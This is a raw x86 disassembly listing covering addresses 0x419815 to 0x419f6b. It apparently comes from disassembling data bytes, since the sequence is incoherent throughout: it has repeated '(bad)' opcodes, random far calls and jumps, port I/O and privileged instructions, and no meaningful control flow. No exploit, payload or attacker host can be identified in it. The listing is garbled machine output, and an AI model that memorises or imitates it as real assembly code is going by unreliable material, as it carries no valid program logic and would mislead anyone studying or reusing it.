  419815:	adc    eax,0x4893bcc2
  41981a:	mov    ds:0x6205fd49,al
  41981f:	adc    al,0x85
  419821:	adc    DWORD PTR ds:0xe714df8f,edx
  419827:	repnz fimul DWORD PTR [eax]
  41982a:	push   ebp
  41982b:	sbb    al,0xdd
  41982d:	dec    eax
  41982e:	leave  
  41982f:	fadd   QWORD PTR [ebp-0x554beda8]
  419835:	(bad)  
  419836:	cmp    al,BYTE PTR [ebp-0x68]
  419839:	push   edi
  41983a:	and    DWORD PTR [ebp+0x23c0b430],ecx
  419840:	dec    esi
  419841:	push   es
  419842:	arpl   bx,sp
  419844:	jns    0x41987c
  419846:	hlt    
  419847:	repz rcr BYTE PTR [esi+0x6a],0xc1
  41984c:	(bad)  
  41984d:	fstp   TBYTE PTR [ecx+0x27]
  419850:	ficom  DWORD PTR [eax+0x3d]
  419853:	xchg   ebx,eax
  419854:	sbb    edi,DWORD PTR [edi+edx*1]
  419857:	imul   DWORD PTR [ebp+0x34]
  41985a:	or     eax,0xf8114e3
  41985f:	and    edx,edx
  419861:	sub    al,0xd1
  419863:	pop    ecx
  419864:	ja     0x419836
  419866:	adc    bl,BYTE PTR [ebx]
  419868:	xchg   edx,eax
  419869:	gs call 0xa8ef:0x6b341efd
  419871:	cld    
  419872:	xchg   edx,ebp
  419874:	mov    edi,0x9ebd618a
  419879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41987a:	pop    edi
  41987b:	pop    eax
  41987c:	rcr    DWORD PTR [eax],cl
  41987e:	dec    edx
  41987f:	gs dec ecx
  419881:	fidivr WORD PTR [ebp-0x5b]
  419884:	inc    ebx
  419885:	mov    ah,0xf9
  419887:	jmp    0xfc12a66e
  41988c:	mov    ebp,0x628b297a
  419891:	ins    DWORD PTR es:[edi],dx
  419892:	(bad)  
  419893:	jnp    0x4198e0
  419895:	cmc    
  419896:	jo     0x41989b
  419898:	jecxz  0x4198f0
  41989a:	gs inc edx
  41989c:	xchg   ebx,eax
  41989d:	jo     0x41982d
  41989f:	push   edx
  4198a0:	clc    
  4198a1:	adc    DWORD PTR ss:[esi-0x62],esi
  4198a5:	loopne 0x41984d
  4198a7:	fmul   QWORD PTR ds:0x93ad2d4d
  4198ad:	(bad)  
  4198af:	jp     0x419880
  4198b1:	lahf   
  4198b2:	mov    edi,0x9dcba89d
  4198b7:	xchg   esp,eax
  4198b8:	adc    cl,BYTE PTR [edi-0x6190c939]
  4198be:	dec    esp
  4198bf:	mov    DWORD PTR [ebx+eiz*1-0x5e],ebp
  4198c3:	or     bl,al
  4198c5:	mov    ah,0xb8
  4198c7:	push   es
  4198c8:	scas   al,BYTE PTR es:[edi]
  4198c9:	addr16 add al,0xc0
  4198cc:	push   0x8245335f
  4198d1:	cwde   
  4198d2:	lds    esi,FWORD PTR [eax+ebx*4+0x16]
  4198d6:	push   cs
  4198d7:	stc    
  4198d8:	xrelease mov BYTE PTR [eax-0x30dfc502],dh
  4198df:	jne    0x4198ac
  4198e1:	push   eax
  4198e2:	gs mov al,0x84
  4198e5:	dec    esi
  4198e6:	dec    ecx
  4198e7:	in     eax,0x2a
  4198e9:	mov    bl,0xa5
  4198eb:	aam    0x19
  4198ed:	mov    cs,esi
  4198ef:	sbb    eax,DWORD PTR [eax-0x5d]
  4198f2:	add    al,0xdd
  4198f4:	jg     0x419888
  4198f6:	push   0xffffffb4
  4198f8:	push   ds
  4198f9:	adc    eax,0xfa0b59ca
  4198fe:	sub    eax,DWORD PTR [ebp-0x29]
  419901:	add    cl,ch
  419903:	jge    0x419909
  419905:	mov    ds:0xbfac7ab6,al
  41990a:	inc    ebp
  41990b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41990c:	push   edx
  41990d:	push   cs
  41990e:	(bad)  [edx-0x3f]
  419911:	push   edx
  419912:	inc    esp
  419913:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419914:	dec    eax
  419915:	mov    ebx,0x98d20868
  41991a:	adc    esp,ecx
  41991c:	mov    ch,0x2d
  41991e:	rol    DWORD PTR [edi+eiz*8+0x3361a0f4],1
  419925:	jb     0x419902
  419927:	fdivr  DWORD PTR [edi-0x56]
  41992a:	pop    ebx
  41992b:	xor    al,0x23
  41992d:	adc    BYTE PTR [ecx+esi*1+0x41],al
  419931:	test   al,0x94
  419933:	sbb    bh,BYTE PTR [ebp+ebx*2+0x3a]
  419937:	adc    BYTE PTR [esp+edi*2+0x7d],cl
  41993b:	iret   
  41993c:	mov    ebx,0x7dd97e48
  419941:	add    ecx,DWORD PTR [eax]
  419943:	std    
  419944:	mov    ah,0xd7
  419946:	xchg   ebx,eax
  419947:	imul   ebp,DWORD PTR [edi-0x7d04b723],0xb7bc8927
  419951:	push   ecx
  419952:	pop    ebx
  419953:	(bad)  
  419954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419955:	xor    eax,0x52f1eb70
  41995a:	bound  ebx,QWORD PTR [ebx+0x78]
  41995d:	dec    ecx
  41995e:	pop    ds
  41995f:	cdq    
  419960:	sub    BYTE PTR [ebp-0x6f4e784f],bh
  419966:	fldenv [ebx]
  419968:	arpl   di,bp
  41996a:	lods   al,BYTE PTR ds:[esi]
  41996b:	inc    eax
  41996c:	je     0x419965
  41996e:	neg    DWORD PTR [esi-0x73]
  419971:	(bad)  
  419972:	lods   eax,DWORD PTR ds:[esi]
  419973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419974:	add    DWORD PTR [esi+0x56],ebp
  419977:	sahf   
  419978:	out    dx,eax
  419979:	ins    DWORD PTR es:[edi],dx
  41997a:	outs   dx,DWORD PTR ds:[esi]
  41997b:	ins    BYTE PTR es:[edi],dx
  41997c:	xchg   ebx,eax
  41997d:	jmp    DWORD PTR [ecx]
  41997f:	enter  0x7455,0x0
  419983:	std    
  419984:	hlt    
  419985:	inc    ecx
  419986:	pop    es
  419987:	inc    edi
  419988:	(bad)
  41998b:	sahf   
  41998c:	cmp    BYTE PTR [edi+eiz*1+0x7047a8a9],bh
  419993:	test   DWORD PTR [eax],edi
  419995:	dec    esp
  419996:	inc    eax
  419997:	mov    bh,0x55
  419999:	(bad)  
  41999a:	stos   DWORD PTR es:[edi],eax
  41999b:	dec    eax
  41999c:	(bad)  
  41999d:	add    edx,DWORD PTR [ecx-0x74]
  4199a0:	inc    eax
  4199a1:	pushf  
  4199a2:	inc    ebp
  4199a3:	and    BYTE PTR [ebp+0x5e],dl
  4199a6:	test   al,0x75
  4199a8:	xchg   ecx,eax
  4199a9:	scas   al,BYTE PTR es:[edi]
  4199aa:	xchg   esi,eax
  4199ab:	(bad)  
  4199ac:	dec    ecx
  4199ad:	test   DWORD PTR [edx-0x55404b5a],ecx
  4199b3:	hlt    
  4199b4:	dec    ebx
  4199b5:	retf   0xdc03
  4199b8:	inc    ebp
  4199b9:	ror    BYTE PTR [esi+ebx*1],0x8f
  4199bd:	cmp    ebp,ecx
  4199bf:	push   ebp
  4199c0:	outs   dx,BYTE PTR ds:[esi]
  4199c1:	imul   esp,DWORD PTR [edx+ecx*2+0x37],0xd3aa6d6a
  4199c9:	pushf  
  4199ca:	in     al,0x8d
  4199cc:	mov    DWORD PTR [ecx+0x64b28766],edx
  4199d2:	or     ebx,esi
  4199d4:	pop    edi
  4199d5:	ret    
  4199d6:	add    DWORD PTR [eax+0x2a],edx
  4199d9:	dec    edi
  4199da:	dec    ecx
  4199db:	sub    al,al
  4199dd:	dec    edi
  4199de:	push   0x57d72948
  4199e3:	xchg   esi,eax
  4199e4:	bound  edx,QWORD PTR [esi+0x30ddcba8]
  4199ea:	xchg   ecx,eax
  4199eb:	aam    0x7a
  4199ed:	call   FWORD PTR [esi-0x3abce37]
  4199f3:	xor    DWORD PTR [ebp+ecx*8+0x27],eax
  4199f7:	and    eax,0x2153e124
  4199fc:	mov    BYTE PTR [esi-0x11],ch
  4199ff:	movups XMMWORD PTR ds:0x9c6e84b,xmm1
  419a06:	mov    ebx,0x642e50e5
  419a0b:	xlat   BYTE PTR ds:[ebx]
  419a0c:	xchg   edx,eax
  419a0d:	arpl   WORD PTR [esi+0x2b],sp
  419a10:	jns    0x4199b5
  419a12:	aad    0x24
  419a14:	pop    ds
  419a15:	xchg   ebp,eax
  419a16:	sbb    al,0x9e
  419a18:	sbb    al,0x32
  419a1a:	xor    DWORD PTR [esi-0x303f9efa],ebp
  419a20:	sub    ch,BYTE PTR [ebx-0x57]
  419a23:	pop    edi
  419a24:	mov    al,0x24
  419a26:	leave  
  419a27:	pop    DWORD PTR [ebx+0x31]
  419a2a:	sub    DWORD PTR [ebx-0x50df82a7],0x6c
  419a31:	cmp    al,0x6b
  419a33:	test   DWORD PTR [eax],edi
  419a35:	fcmove st,st(6)
  419a37:	sbb    al,0xd1
  419a39:	mov    ah,0x67
  419a3b:	fcmovnb st,st(5)
  419a3d:	jle    0xe001b832
  419a43:	sub    al,0x55
  419a45:	es stc 
  419a47:	mov    ds:0xc426fc96,eax
  419a4c:	adc    dl,BYTE PTR [ebx]
  419a4e:	(bad)  
  419a50:	xor    DWORD PTR [edi+0x49b25681],eax
  419a56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a57:	cmp    BYTE PTR [esi],bh
  419a59:	xchg   DWORD PTR [ebp-0x7720732a],edi
  419a5f:	dec    eax
  419a60:	xchg   ecx,eax
  419a61:	inc    ecx
  419a62:	lea    edi,[edx+esi*2-0x56]
  419a66:	aas    
  419a67:	pop    edi
  419a68:	dec    ebx
  419a69:	(bad)  
  419a6a:	mov    edx,0x6f735a80
  419a6f:	cmp    esp,esi
  419a71:	cmp    eax,0x10e4ac8f
  419a76:	clc    
  419a77:	and    al,BYTE PTR cs:[edi]
  419a7a:	cmp    DWORD PTR [edi+edx*1],eax
  419a7d:	jmp    0x93aa5c4e
  419a82:	sbb    al,0xf8
  419a84:	out    0xff,al
  419a86:	add    DWORD PTR [esp+edx*4],esp
  419a89:	int    0xed
  419a8b:	fidiv  DWORD PTR [ebp-0x48]
  419a8e:	stos   BYTE PTR es:[edi],al
  419a8f:	scas   al,BYTE PTR es:[edi]
  419a90:	jmp    0xd4ef:0x6b7d146c
  419a97:	out    0x8a,al
  419a99:	cmp    BYTE PTR [ebp+0x13],0x1c
  419a9d:	ret    0xaca4
  419aa0:	dec    edx
  419aa1:	xchg   edx,eax
  419aa2:	mov    esi,ds
  419aa4:	mov    al,0x6
  419aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419aa7:	cli    
  419aa8:	pushf  
  419aa9:	push   ss
  419aaa:	or     ecx,edi
  419aac:	imul   bl
  419aae:	push   esp
  419aaf:	add    BYTE PTR [ecx],bh
  419ab1:	hlt    
  419ab2:	mov    eax,ds:0xc1455199
  419ab7:	push   ebp
  419ab8:	xor    al,0x57
  419aba:	jecxz  0x419af5
  419abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419abd:	jl     0x419a97
  419abf:	test   eax,0x32e739b6
  419ac4:	mov    eax,ds:0xc0ec9ca8
  419ac9:	test   BYTE PTR [esi+0x34],ah
  419acc:	popf   
  419acd:	rol    DWORD PTR [ebx+0x2a5c9534],0xac
  419ad4:	sub    ecx,DWORD PTR [esi]
  419ad6:	or     DWORD PTR [eax-0x19],ebx
  419ad9:	sub    BYTE PTR [ebp-0x27],al
  419adc:	es push esp
  419ade:	(bad)  
  419adf:	out    dx,al
  419ae0:	adc    edi,DWORD PTR [ecx+0x4e]
  419ae3:	push   esp
  419ae4:	or     BYTE PTR [esi],bl
  419ae6:	test   DWORD PTR [edx],esi
  419ae8:	stos   BYTE PTR es:[edi],al
  419ae9:	and    eax,0xad210de5
  419aee:	shr    BYTE PTR [esi],0x8c
  419af1:	lea    ebp,[edx]
  419af3:	fs ins DWORD PTR es:[edi],dx
  419af5:	jns    0x419b44
  419af7:	call   DWORD PTR [eax+eax*2-0x18]
  419afb:	xchg   ecx,eax
  419afc:	outs   dx,BYTE PTR ds:[esi]
  419afd:	cmp    edx,DWORD PTR [ebx+eiz*1]
  419b00:	aaa    
  419b01:	mov    eax,0x35161fbf
  419b06:	jo     0x419b07
  419b08:	mov    DWORD PTR [esi+0x74d1314d],eax
  419b0e:	jle    0x419aa5
  419b10:	mov    al,ds:0x75a7c46e
  419b15:	xor    eax,0xcb4d55ca
  419b1a:	add    al,0xf8
  419b1c:	xchg   edi,eax
  419b1d:	aaa    
  419b1e:	and    eax,0xce6f8cdc
  419b23:	js     0x419af0
  419b25:	cmp    al,0x99
  419b27:	mov    ebx,0xa9342001
  419b2c:	push   edi
  419b2d:	outs   dx,DWORD PTR ds:[esi]
  419b2e:	popa   
  419b2f:	and    dl,BYTE PTR [edi+0x1544037f]
  419b35:	lods   al,BYTE PTR ds:[esi]
  419b36:	jo     0x419b6c
  419b38:	je     0x419b86
  419b3a:	mov    al,0x29
  419b3c:	out    dx,eax
  419b3d:	adc    cl,bh
  419b3f:	(bad)  
  419b40:	fsub   DWORD PTR [eax]
  419b42:	or     dh,BYTE PTR es:[ebp+0x35]
  419b46:	mov    dl,0xcc
  419b48:	dec    edx
  419b49:	and    ebp,esp
  419b4b:	xor    eax,0x6ace0dcd
  419b50:	jns    0x419b89
  419b52:	xor    esp,esi
  419b54:	inc    ecx
  419b55:	loopne 0x419b7c
  419b57:	mov    cl,0x9
  419b59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b5a:	stc    
  419b5b:	retf   
  419b5c:	cmp    dh,BYTE PTR [ebp+0x3807f920]
  419b62:	pop    ds
  419b63:	popa   
  419b64:	lahf   
  419b65:	pop    ds
  419b66:	jbe    0x419b20
  419b68:	out    dx,al
  419b69:	cmp    dh,al
  419b6b:	push   edi
  419b6c:	fldcw  WORD PTR ds:0x46350110
  419b72:	int    0x9
  419b74:	push   ebx
  419b75:	jns    0x419ba6
  419b77:	mov    WORD PTR [esi],gs
  419b79:	aam    0x4e
  419b7b:	in     al,dx
  419b7c:	adc    al,BYTE PTR [edx+edi*4]
  419b7f:	iret   
  419b80:	fs mov ?,ebx
  419b83:	jae    0x419b7e
  419b85:	sahf   
  419b86:	es ret 0x3abc
  419b8a:	mov    esi,0x6ae4fed
  419b8f:	and    ebp,DWORD PTR [eax]
  419b91:	pusha  
  419b92:	mov    ss,WORD PTR [edi]
  419b94:	xchg   BYTE PTR [esi],dl
  419b96:	pop    ss
  419b97:	add    eax,0x7c92dbb7
  419b9c:	scas   eax,DWORD PTR es:[edi]
  419b9d:	push   0x51
  419b9f:	mov    ss:0x47905197,eax
  419ba5:	ja     0x419c01
  419ba7:	aas    
  419ba8:	ins    BYTE PTR es:[edi],dx
  419ba9:	pop    ebx
  419baa:	pop    edi
  419bab:	aad    0xbb
  419bad:	jno    0x419b45
  419baf:	outs   dx,DWORD PTR ds:[esi]
  419bb0:	ficom  DWORD PTR [eax+0xd]
  419bb3:	pusha  
  419bb4:	inc    ebp
  419bb5:	pop    esi
  419bb6:	xor    al,0x4a
  419bb8:	fcmovnbe st,st(4)
  419bba:	mov    cs,WORD PTR [ecx-0x5bc94199]
  419bc0:	xor    BYTE PTR cs:[ebp+0x54],dl
  419bc4:	sub    ch,BYTE PTR [edx+ecx*1+0x4bf39c6c]
  419bcb:	jmp    0x419b8e
  419bcd:	call   0x5dfb:0x1a4081b3
  419bd4:	jge    0x419bb5
  419bd6:	test   al,0x0
  419bd8:	fisub  DWORD PTR [edi]
  419bda:	inc    esi
  419bdb:	(bad)  
  419bdc:	aas    
  419bdd:	xor    ch,al
  419bdf:	leave  
  419be0:	imul   edi,DWORD PTR [ecx-0x3b],0x1
  419be4:	push   ecx
  419be5:	sbb    ebx,DWORD PTR [edi+ebx*2+0x46]
  419be9:	shr    DWORD PTR ds:0x249f95ad,1
  419bef:	out    0x6d,al
  419bf1:	mov    edx,0xab9f7a5e
  419bf6:	ficom  WORD PTR [eax-0x56]
  419bf9:	inc    ebx
  419bfa:	test   DWORD PTR [eax+0x77],esp
  419bfd:	and    al,0x7a
  419c00:	adc    cl,BYTE PTR [eax]
  419c02:	jae    0x419bb9
  419c04:	add    DWORD PTR [ebx+ecx*4+0x45c798ba],ebp
  419c0b:	mov    ebx,0x5ece015
  419c10:	call   DWORD PTR [edi+0x12]
  419c13:	call   0x4ea12f1
  419c18:	mov    BYTE PTR [eax],al
  419c1a:	mov    bl,0x1d
  419c1c:	push   ecx
  419c1d:	cwde   
  419c1e:	sbb    al,0x3
  419c20:	loop   0x419bff
  419c22:	aad    0xce
  419c24:	or     al,0x4a
  419c26:	into   
  419c27:	push   ss
  419c28:	(bad)  
  419c2a:	loopne 0x419c81
  419c2c:	mov    ds,edi
  419c2e:	adc    ebx,DWORD PTR [ebx+0x11]
  419c31:	imul   edx,DWORD PTR [eax+edx*4],0xf2c268ad
  419c38:	mov    cl,BYTE PTR [edi+edx*2]
  419c3b:	(bad)
  419c3f:	popa   
  419c40:	dec    edi
  419c41:	rcl    BYTE PTR [esi],0x8
  419c44:	int    0xc7
  419c46:	scas   al,BYTE PTR es:[edi]
  419c47:	jl     0x419bcf
  419c49:	int3   
  419c4a:	mov    WORD PTR [esi-0x4c0a31a6],es
  419c50:	pop    edi
  419c51:	scas   al,BYTE PTR es:[edi]
  419c52:	scas   al,BYTE PTR es:[edi]
  419c53:	dec    edx
  419c54:	leave  
  419c55:	addr16 jae 0x419c87
  419c58:	jnp    0x419bf3
  419c5a:	inc    ebp
  419c5b:	pop    ecx
  419c5c:	das    
  419c5d:	lods   eax,DWORD PTR ds:[esi]
  419c5e:	adc    eax,0x1828c60e
  419c63:	popa   
  419c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c65:	pop    esp
  419c66:	test   al,0x94
  419c68:	gs pusha 
  419c6a:	ss xchg ecx,eax
  419c6c:	push   esp
  419c6d:	and    ebp,esi
  419c6f:	xchg   edi,eax
  419c70:	xchg   ecx,eax
  419c71:	jb     0x419cc5
  419c73:	addr16 mov edx,0xcb65c0cf
  419c79:	pop    ss
  419c7a:	adc    al,0x61
  419c7c:	push   cs
  419c7d:	xchg   edi,eax
  419c7e:	add    BYTE PTR [edx-0x58],dh
  419c81:	jecxz  0x419c71
  419c83:	mov    ds:0xc0204df3,eax
  419c88:	xchg   ecx,eax
  419c89:	leave  
  419c8a:	in     al,0x2d
  419c8c:	stos   BYTE PTR es:[edi],al
  419c8d:	in     eax,dx
  419c8e:	lods   al,BYTE PTR ds:[esi]
  419c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c90:	jmp    0x292:0x107c475b
  419c97:	popf   
  419c98:	cmp    cl,BYTE PTR [eax]
  419c9a:	xchg   BYTE PTR ds:0x75b1a5b9,cl
  419ca0:	rcl    BYTE PTR [ebx+0x6d],cl
  419ca3:	mov    esp,0xfc0bfb98
  419ca8:	outs   dx,BYTE PTR ds:[esi]
  419ca9:	retf   0xebe4
  419cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cad:	js     0x419c84
  419caf:	pop    ebp
  419cb0:	popf   
  419cb1:	mov    ebp,esi
  419cb3:	push   ebp
  419cb4:	ins    DWORD PTR es:[edi],dx
  419cb5:	dec    ecx
  419cb6:	in     al,0x1b
  419cb8:	mov    cl,0x9e
  419cba:	fldcw  WORD PTR [ebx]
  419cbc:	sti    
  419cbd:	adc    edi,ebx
  419cbf:	(bad)  
  419cc0:	jl     0x419d0d
  419cc2:	ret    
  419cc3:	mov    ebp,0x79e7af8
  419cc8:	in     al,0xb0
  419cca:	pop    ebp
  419ccb:	mov    ecx,0xcdb3519f
  419cd0:	aas    
  419cd1:	in     al,dx
  419cd2:	(bad)  [eax]
  419cd4:	inc    ebp
  419cd6:	xchg   edi,eax
  419cd7:	mov    ds:0xbd1e2aa0,al
  419cdc:	mov    eax,gs:0x3a423c38
  419ce2:	sbb    al,0x65
  419ce4:	data16 rcr BYTE PTR [eax],1
  419ce7:	push   eax
  419ce8:	push   cs
  419ce9:	jmp    0xd5890c2
  419cee:	pop    esi
  419cef:	lahf   
  419cf0:	push   0x13
  419cf2:	jbe    0x419d22
  419cf4:	ins    DWORD PTR es:[edi],dx
  419cf5:	sbb    BYTE PTR [bx],bl
  419cf8:	or     bl,BYTE PTR [edx+0x47]
  419cfb:	pop    DWORD PTR [ebp+0x75996474]
  419d01:	inc    edi
  419d02:	sti    
  419d03:	mov    al,ds:0x7c6da0ea
  419d08:	push   ebx
  419d09:	test   eax,0x5a75b158
  419d0e:	sub    al,0x45
  419d10:	sbb    bl,ch
  419d12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d13:	or     al,0xea
  419d15:	mov    ds:0x30f28300,al
  419d1a:	adc    al,0x3f
  419d1c:	xor    BYTE PTR [ecx+0x1d],dh
  419d1f:	and    BYTE PTR [ebx+0x11b78db3],ch
  419d25:	mov    ebp,DWORD PTR [edx+ecx*2-0x1cd58d8a]
  419d2c:	xchg   ebp,eax
  419d2d:	ds pop eax
  419d2f:	loopne 0x419d43
  419d31:	push   0xfffffffd
  419d33:	int3   
  419d34:	lock pushf 
  419d36:	cmp    DWORD PTR [ecx],edi
  419d38:	wbinvd 
  419d3a:	pop    edi
  419d3b:	push   ds
  419d3c:	and    eax,0x7be11fb6
  419d41:	adc    edx,DWORD PTR [eax-0x60]
  419d44:	dec    esi
  419d45:	mov    edi,0xbdcd835
  419d4a:	xchg   esi,eax
  419d4b:	jmp    0x419d2f
  419d4d:	bound  edi,QWORD PTR [edi-0x41d4fd92]
  419d53:	icebp  
  419d54:	test   eax,0xdd380bd
  419d59:	icebp  
  419d5a:	or     cl,BYTE PTR [ebx+0x7e39960b]
  419d60:	xor    DWORD PTR [ebp+esi*4-0x25b73ca3],0x32
  419d68:	jp     0x419d7f
  419d6a:	mov    esp,0x5a9eb50b
  419d6f:	lock mov eax,ds:0x2a9a15d1
  419d75:	popf   
  419d76:	addr16 clc 
  419d78:	pop    edi
  419d79:	leave  
  419d7a:	adc    DWORD PTR [esi],edx
  419d7c:	mov    dh,0x24
  419d7e:	xor    ebx,DWORD PTR [edx-0x3c]
  419d81:	ret    
  419d82:	push   es
  419d83:	mov    gs,WORD PTR [esi-0x5628f5c0]
  419d89:	sbb    dh,BYTE PTR [esi-0x1752e8d2]
  419d8f:	pop    edi
  419d90:	push   cs
  419d91:	js     0x419d2e
  419d93:	push   edi
  419d94:	sbb    ah,al
  419d96:	fadd   st(7),st
  419d98:	jge    0x419d52
  419d9a:	xor    DWORD PTR ds:0xac26003c,eax
  419da0:	out    0x4,al
  419da2:	int3   
  419da3:	int    0x50
  419da5:	fdivrp st(6),st
  419da7:	mov    eax,0x74c4f839
  419dac:	sbb    al,0xc3
  419dae:	push   ecx
  419daf:	inc    eax
  419db0:	cmp    edi,edx
  419db2:	fucomi st,st(2)
  419db4:	les    ecx,FWORD PTR [ebp-0x32d72324]
  419dba:	mov    al,0xef
  419dbc:	sbb    eax,DWORD PTR [ebx]
  419dbe:	jecxz  0x419d44
  419dc0:	cmp    DWORD PTR [ecx],ecx
  419dc2:	cdq    
  419dc3:	cmp    eax,0x75cbf857
  419dc8:	fs adc al,0x24
  419dcb:	pop    ecx
  419dcc:	sbb    edi,DWORD PTR [eax+0x14a1b67]
  419dd2:	idiv   BYTE PTR [ebx+0x5f282136]
  419dd8:	and    esp,esp
  419dda:	mov    WORD PTR [esi-0x47d62ab1],cs
  419de0:	dec    esp
  419de1:	std    
  419de2:	inc    eax
  419de3:	xor    eax,0x15d6a358
  419de8:	or     esp,ebx
  419dea:	xchg   ebp,eax
  419deb:	mov    BYTE PTR [ebx+edx*1-0x6d],ch
  419def:	push   esi
  419df0:	pusha  
  419df1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419df2:	test   eax,0xee5f9300
  419df7:	das    
  419df8:	jno    0x419e56
  419dfa:	pop    ss
  419dfb:	jbe    0x419e18
  419dfd:	mov    bh,BYTE PTR [eax-0x325ca1fb]
  419e03:	pusha  
  419e04:	aaa    
  419e05:	test   dl,ch
  419e07:	push   0xf9617bac
  419e0c:	and    al,0x22
  419e0e:	aas    
  419e0f:	ret    
  419e10:	xchg   ebx,eax
  419e11:	stos   BYTE PTR es:[edi],al
  419e12:	int3   
  419e13:	adc    eax,0x92465283
  419e18:	pushf  
  419e19:	shr    BYTE PTR [ebp-0x2e],1
  419e1c:	sbb    al,0x99
  419e1e:	lahf   
  419e1f:	and    dl,dl
  419e21:	and    al,0x33
  419e23:	jb     0x419e6a
  419e25:	inc    edx
  419e26:	pop    ss
  419e27:	jbe    0x419e7a
  419e29:	mov    ch,0x8f
  419e2b:	rol    DWORD PTR [edx+ecx*8],0x47
  419e2f:	in     al,0x9b
  419e31:	adc    DWORD PTR [ebp+0x37],edx
  419e34:	js     0x419eb3
  419e36:	xchg   esp,eax
  419e37:	cdq    
  419e38:	test   al,0x82
  419e3a:	jnp    0x419e1b
  419e3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e3d:	inc    ecx
  419e3e:	mov    ch,0xa2
  419e40:	push   esp
  419e41:	push   si
  419e43:	ins    DWORD PTR es:[edi],dx
  419e44:	and    edx,DWORD PTR [eax]
  419e46:	add    BYTE PTR [edx],dh
  419e48:	dec    edi
  419e49:	stos   DWORD PTR es:[edi],eax
  419e4a:	mov    ebp,0xefd92dbf
  419e4f:	cld    
  419e50:	hlt    
  419e51:	add    dl,bl
  419e53:	std    
  419e54:	leave  
  419e55:	xor    eax,0xa0702dc4
  419e5a:	push   cs
  419e5b:	sbb    dl,BYTE PTR [ecx]
  419e5d:	add    ebp,ecx
  419e5f:	push   esi
  419e60:	sbb    dl,BYTE PTR [esi-0x2c828607]
  419e66:	stos   BYTE PTR es:[edi],al
  419e67:	cwde   
  419e68:	fdivr  DWORD PTR [esi]
  419e6a:	lds    esi,FWORD PTR [edi+eax*8]
  419e6d:	jp     0x419eac
  419e6f:	out    0x55,al
  419e71:	es nop
  419e73:	dec    edi
  419e74:	mov    dl,0x52
  419e76:	xor    BYTE PTR [ebx+0xf],bh
  419e79:	jecxz  0x419e22
  419e7b:	ds call 0xb02bf3e3
  419e81:	imul   eax,DWORD PTR [esi-0x1021bd5a],0xdfd4d4
  419e8b:	sub    eax,0xe9ce9e4b
  419e90:	ja     0x419e35
  419e92:	je     0x419eb2
  419e94:	pusha  
  419e95:	adc    bl,BYTE PTR [ebx+0x22261d9a]
  419e9b:	xchg   edx,eax
  419e9c:	jns    0x419ed9
  419e9e:	sbb    esp,edi
  419ea0:	mov    BYTE PTR [eax+0x31],ah
  419ea3:	arpl   WORD PTR [ecx+0x7b3a3723],di
  419ea9:	adc    BYTE PTR [eax-0x61],al
  419eac:	jo     0x419e35
  419eae:	xor    DWORD PTR [edx],0x72
  419eb1:	push   eax
  419eb2:	lahf   
  419eb3:	sti    
  419eb4:	mov    ecx,0x8ad825f4
  419eb9:	dec    ebx
  419eba:	inc    ebp
  419ebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ebc:	xchg   edx,eax
  419ebd:	adc    BYTE PTR [eax-0x25],ch
  419ec0:	iretw  
  419ec2:	aam    0x0
  419ec4:	fsubr  QWORD PTR [ebp-0x491cac1c]
  419eca:	push   ds
  419ecb:	call   0x9120c117
  419ed0:	xor    eax,0x711777a1
  419ed5:	jne    0x419f03
  419ed7:	add    DWORD PTR [edx+0x16],esi
  419eda:	and    ah,dl
  419edc:	add    al,0x7a
  419ede:	outs   dx,BYTE PTR ds:[esi]
  419edf:	clc    
  419ee0:	sub    DWORD PTR [esi-0x6d],ebx
  419ee3:	xchg   ecx,eax
  419ee4:	xchg   esi,eax
  419ee5:	dec    edi
  419ee6:	dec    ebp
  419ee7:	mov    bh,bh
  419ee9:	mov    cl,0x51
  419eeb:	mov    edi,DWORD PTR [edi-0x78]
  419eee:	call   0x2aa9:0x5b290dad
  419ef5:	mov    dl,0x53
  419ef7:	pushf  
  419ef8:	sar    esp,cl
  419efa:	(bad)  
  419efb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419efc:	(bad)  
  419efd:	or     al,0xab
  419eff:	clc    
  419f00:	std    
  419f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f02:	push   edx
  419f03:	push   eax
  419f04:	adc    ecx,DWORD PTR [edi-0x5d]
  419f07:	adc    DWORD PTR [eax+ebp*4+0x67d57428],ebp
  419f0e:	addr16 xor eax,0x368eb363
  419f14:	and    ah,BYTE PTR [edi+ebx*1+0x2f3590a7]
  419f1b:	pop    ds
  419f1c:	test   DWORD PTR [esi+0x77],ebp
  419f1f:	jb     0x419f8b
  419f21:	sahf   
  419f22:	jne    0x419ee7
  419f24:	add    eax,0x319fa022
  419f29:	call   0xa72f:0x8ba85cc
  419f30:	repz std 
  419f32:	outs   dx,DWORD PTR ds:[esi]
  419f33:	adc    edi,DWORD PTR [edi]
  419f35:	pop    ebp
  419f36:	xor    al,0x9e
  419f38:	in     eax,0x1
  419f3a:	fs loop 0x419f56
  419f3d:	fild   QWORD PTR [edi+0x35e4eb67]
  419f43:	imul   eax,esp,0xffffffb8
  419f46:	sub    al,0x2e
  419f48:	inc    ebp
  419f49:	jmp    0x419fb1
  419f4b:	out    dx,eax
  419f4c:	sti    
  419f4d:	mov    esi,0xc3ec677a
  419f52:	lea    edx,[eax+0x201b005a]
  419f58:	inc    ecx
  419f59:	pushf  
  419f5a:	in     eax,dx
  419f5b:	jae    0x419f0f
  419f5d:	mov    ebp,0x25b24c11
  419f62:	jne    0x419fde
  419f64:	or     al,0x19
  419f66:	not    BYTE PTR [edi]
  419f68:	test   al,0xb2
  419f6a:	pop    edx
  419f6b:	sub    cl,BYTE PTR [ecx+0x4a]
